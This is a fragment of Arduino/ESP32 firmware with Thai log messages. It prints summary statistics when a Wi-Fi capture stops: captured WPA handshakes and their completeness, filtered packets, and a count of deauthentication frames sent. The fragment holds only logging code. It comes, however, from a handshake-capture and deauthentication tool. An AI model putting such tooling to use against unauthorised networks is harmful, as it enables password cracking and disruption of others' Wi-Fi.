    float filterRatio = (packetCount > 0) ? ((float)filteredPacketCount / packetCount * 100.0) : 0;
    
    Serial.println("========================================");
    Serial.println("[CAPTURE] หยุดการดักจับ");
    Serial.printf("[CAPTURE] สถิติรวม:\n");
    Serial.printf("[CAPTURE] - รอบทั้งหมด: %d\n", cycleCount);
    Serial.printf("[CAPTURE] - Handshakes: %d/%d สมบูรณ์\n", completeCount, handshakeCount);
    Serial.printf("[CAPTURE] - Packets รวม: %lu\n", packetCount);
    Serial.printf("[CAPTURE] - Packets กรองแล้ว: %lu (%.1f%%)\n", filteredPacketCount, filterRatio);
    Serial.printf("[CAPTURE] - Beacon trackers: %d\n", beaconTrackerCount);
    Serial.printf("[CAPTURE] - Deauth sent: %lu\n", deauthCount);
    Serial.printf("[CAPTURE] - ไฟล์: %s\n", currentFilename);
    
    // แสดงรายละเอียด handshakes
    for (int i = 0; i < handshakeCount; i++) {
        String ssid = getSSIDFromBSSID(handshakes[i].bssid);
        Serial.printf("[CAPTURE] HS%d: %s | CH%d | Flags:%d%d%d%d %s\n", 
                     i + 1,
                     ssid.c_str(),
                     handshakes[i].channel,
                     (handshakes[i].messageFlags & 0x01) ? 1 : 0,
                     (handshakes[i].messageFlags & 0x02) ? 1 : 0,
                     (handshakes[i].messageFlags & 0x04) ? 1 : 0,
                     (handshakes[i].messageFlags & 0x08) ? 1 : 0,
                     handshakes[i].complete ? "[COMPLETE]" : "");
    }
    
    Serial.println("========================================");
}